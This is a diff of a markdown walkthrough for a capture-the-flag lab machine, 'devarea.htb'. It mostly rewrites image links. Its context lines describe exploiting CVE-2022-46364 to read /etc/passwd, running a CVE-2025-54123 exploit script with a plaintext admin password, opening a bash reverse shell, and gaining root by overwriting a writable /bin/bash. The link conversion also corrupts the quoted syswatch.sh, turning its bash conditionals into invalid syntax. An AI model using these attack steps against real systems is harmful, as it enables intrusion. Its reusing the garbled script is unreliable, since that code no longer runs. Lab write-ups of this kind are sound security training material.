@@ -26,10 +26,10 @@ This is a lot of ports, with the common ssh and web (port 22 and 80 respectively
 ### Web Reconnaissance
 
 Viewing the website, it seems to be some form of recruiting site for developers to both find jobs and for companies to find developers:
-![[Pasted image 20260402132432.png]]
+![Pasted image 20260402132432](Pasted%20image%2020260402132432.png)
 
 None of the buttons on the site seem to lead anywhere. Viewing a 404 error page, leaks that Apache 2.4.58 is in use:
-![[Pasted image 20260402132626.png]]
+![Pasted image 20260402132626](Pasted%20image%2020260402132626.png)
 
 Directory fuzzing:
 
@@ -38,7 +38,7 @@ feroxbuster --url http://devarea.htb/
 ```
 
 This returns nothing of note:
-![[Pasted image 20260402132923.png]]
+![Pasted image 20260402132923](Pasted%20image%2020260402132923.png)
 
 Subdomain / vhost enumeration:
 
@@ -51,7 +51,7 @@ This doesn't find any subdomains, suggesting the http server may be a dead end f
 ### FTP Enumeration
 
 When connecting initially to the FTP server with a dummy username, it states "This FTP server is anonymous only." This also shows that vsFTPd 3.0.5 is in use:
-![[Pasted image 20260402133148.png]]
+![Pasted image 20260402133148](Pasted%20image%2020260402133148.png)
 
 Suggesting we might be able to connect anonymously. Attempting this works:
 ```bash
@@ -59,7 +59,7 @@ ftp anonymous@devarea.htb
 ```
 
 Inside the ftp share is a single folder `pub` with a single `.jar` file called `employee-service.jar`, which I download for later analysis:
-![[Pasted image 20260402133335.png]]
+![Pasted image 20260402133335](Pasted%20image%2020260402133335.png)
 
 ### Additional Fingerprinting
 At this stage I suspect the `.jar` file is the way forward, however to avoid rabbit-holes I want to properly enumerate the other services. There are 3 ports - 8080, 8500 and 8888.
@@ -68,7 +68,7 @@ At this stage I suspect the `.jar` file is the way forward, however to avoid rab
 Running a stronger nmap scan, with the `-sV` flag shows that this site is running `Jetty 9.4.27.v20200227` and is an http server.
 
 Viewing this in the browser shows a 404 error, also disclosing Jetty is in use:
-![[Pasted image 20260402134821.png]]
+![Pasted image 20260402134821](Pasted%20image%2020260402134821.png)
 
 I will perform subdirectory enumeration on this:
 ```bash
@@ -84,15 +84,15 @@ Both return nothing.
 
 #### Port 8500
 Scanning port 8500 with nmap, returns a slightly garbled response signifying it _might_ be a golang http server. Visiting the port directly we get the following message:
-![[Pasted image 20260402135234.png]]
+![Pasted image 20260402135234](Pasted%20image%2020260402135234.png)
 
 I try using the proxy to connect to one of the web servers, but it fails, requiring authentication:
-![[Pasted image 20260402142145.png]]
+![Pasted image 20260402142145](Pasted%20image%2020260402142145.png)
 #### Port 8888
 Finally, scanning this port with nmap, shows that it is likely a golang http server with either `(Go-IPFS json-rpc or InfluxDB API)`.
 
 Visiting this port directly in the browser we get another web page **Hoverfly** with a login page, documentation and a github, suggesting this is an off the shelf product:
-![[Pasted image 20260402135454.png]]
+![Pasted image 20260402135454](Pasted%20image%2020260402135454.png)
 
 I will perform subdirectory enumeration on this:
 ```bash
@@ -119,16 +119,16 @@ At this stage I have a good understanding of all the services running and have i
 To analyse the jar file I use `jd-gui`
 
 Digging into the files, we notice this appears to be the code for the server running on port 8080, and it gives hints to some potentially useful endpoints:
-![[Pasted image 20260402140246.png]]
+![Pasted image 20260402140246](Pasted%20image%2020260402140246.png)
 
 This appears to be a few simple SOAP APIs that are used for submitting reports, we can view the documentation for the APIs at `http://devarea.htb:8080/employeeservice?wsdl`:
-![[Pasted image 20260402140438.png]]
+![Pasted image 20260402140438](Pasted%20image%2020260402140438.png)
 
 As these are SOAP XML APIs I attempt some XXE/XML injection but to no avail:
-![[Pasted image 20260402141252.png]]
+![Pasted image 20260402141252](Pasted%20image%2020260402141252.png)
 
 At this stage I have an AI agent analyse the code for me, which extracts that Apache CXF 3.2.14 is in use which is vulnerable to CVE-2022-46364. We can confirm this version of apache is in use by looking at the pom.xml:
-![[Pasted image 20260402143329.png]]
+![Pasted image 20260402143329](Pasted%20image%2020260402143329.png)
 
 ### CVE-2022-46364
 This CVE is related to a vulnerability in the href attribute of XOP:include in versions of Apache CXF before 3.4.10, and allows SSRF or LFI.
@@ -142,10 +142,10 @@ curl -X POST http://devarea.htb:8080/employeeservice \
 ```
 
 This returns a base64 encoded `/etc/passwd`:
-![[Pasted image 20260402143615.png]]
+![Pasted image 20260402143615](Pasted%20image%2020260402143615.png)
 
 Which decodes to:
-![[Pasted image 20260402143652.png]]
+![Pasted image 20260402143652](Pasted%20image%2020260402143652.png)
 
 Key users here are `dev_ryan` and `root`.
 
@@ -216,7 +216,7 @@ python3 CVE-2025-54123.py -u admin -p O7IJ27MyyXiU -t http://devarea.htb:8888 -c
 ```
 
 And we get the expected output:
-![[Pasted image 20260402145232.png]]
+![Pasted image 20260402145232](Pasted%20image%2020260402145232.png)
 ### Gaining a shell
 
 I first set up a penelope listener, and then modify the payload to execute a simple bash reverse shell:
@@ -226,7 +226,7 @@ python3 CVE-2025-54123.py -u admin -p O7IJ27MyyXiU -t http://devarea.htb:8888 -c
 ### Shell as dev_ryan
 
 This grants us a shell as dev_ryan and we can grab the user shell:
-![[Pasted image 20260402145512.png]]
+![Pasted image 20260402145512](Pasted%20image%2020260402145512.png)
 
 ---
 
@@ -235,7 +235,7 @@ This grants us a shell as dev_ryan and we can grab the user shell:
 ### Enumeration
 
 In the home directory there is a file named `syswatch-v1.zip` which is unusual. Checking the sudo permissions for dev_ryan returns:
-![[Pasted image 20260402160645.png]]
+![Pasted image 20260402160645](Pasted%20image%2020260402160645.png)
 
 We do not have the permissions to view /opt/syswatch but by unzipping  `syswatch-v1.zip` we can find `syswatch.sh` and make the assumption that this is the same file we can run as root
 
@@ -323,7 +323,7 @@ status_web() {
 
 execute_plugin() {
     local plugin="$1"; shift
-    if [[ ! $plugin =~ $SAFE_PLUGIN_REGEX ]]; then
+    if [ ! $plugin =~ $SAFE_PLUGIN_REGEX ](%20!%20$plugin%20=~%20$SAFE_PLUGIN_REGEX%20); then
         echo "Invalid plugin name" >&2
         return 1
     fi
@@ -381,7 +381,7 @@ view_logs() {
 
     # FILE NAME VALIDATION
     local file="${arg:-system.log}"
-    if [[ ! "$file" =~ $SAFE_LOG_REGEX ]]; then
+    if [ ! "$file" =~ $SAFE_LOG_REGEX ](%20!%20"$file"%20=~%20$SAFE_LOG_REGEX%20); then
         echo "[Invalid log filename]: $file"
         return 1
     fi
@@ -391,12 +391,12 @@ view_logs() {
         local target
         target=$(ls -l "$path" | awk '{print $NF}')
 
-        if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
+        if [| "$target" == *".."* || "$target" == *"\\"* ](%20"$target"%20==%20*"/"*%20); then
             echo "[Blocked unsafe symlink target]: $file -> $target"
             return 1
         fi
 
-        if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
+        if [ "$target" =~ ^[A-Za-z0-9_.-](%20"$target"%20=~%20^[A-Za-z0-9_.-); then
             local resolved="$LOG_DIR/$target"
             if [ -f "$resolved" ]; then
                 cat "$resolved"
@@ -407,7 +407,7 @@ view_logs() {
             fi
         fi
 
-        if [[ "$target" == /var/log/* ]]; then
+        if [ "$target" == /var/log/* ](%20"$target"%20==%20/var/log/*%20); then
             [ -f "$target" ] && cat "$target" && return
             echo "[Symlink target not regular file]: $file -> $target"
             return 1
@@ -417,7 +417,7 @@ view_logs() {
         return 1
     fi
 
-    if [[ "$file" == */* || "$file" == *".."* ]]; then
+    if [| "$file" == *".."* ](%20"$file"%20==%20*/*%20); then
         echo "[Blocked unsafe filename]: $file"
         return 1
     fi
@@ -467,7 +467,7 @@ main() {
 if [ "$(id -u)" -eq 0 ]; then
     main "$@"
 else
-    if [[ "${1:-}" == "logs" ]]; then
+    if [ "${1:-}" == "logs" ](%20"${1:-}"%20==%20"logs"%20); then
         main "$@"
     else
         echo "Access denied. Root required for this action." >&2
@@ -483,7 +483,7 @@ I play around with this and other ideas around path manipulation with no luck.
 ### File permissions
 
 Bizarrely, whether misconfigured or otherwise, we have write permission over `/bin/bash`. As `/bin/bash` is called at the top of our syswatch script, we should be able to overwrite this with a malicious binary in order to gain a shell:
-![[Pasted image 20260402162529.png]]
+![Pasted image 20260402162529](Pasted%20image%2020260402162529.png)
 ### Exploit PoC
 
 To execute this I create a few steps. Firstly, I need to switch my current shell over to `/bin/sh` so I don't loose it. I repeat the steps above to gain a shell but with `python`, this time not using penelope, and instead using `nc`, as penelope's shell upgrading process was using bash:
@@ -530,10 +530,10 @@ sudo /opt/syswatch/syswatch.sh --version
 ```
 
 After doing all these steps we can elevate to root:
-![[Pasted image 20260402170104.png]]
+![Pasted image 20260402170104](Pasted%20image%2020260402170104.png)
 
 And get the root flag:
-![[Pasted image 20260402170134.png]]
+![Pasted image 20260402170134](Pasted%20image%2020260402170134.png)
 
 ---
 
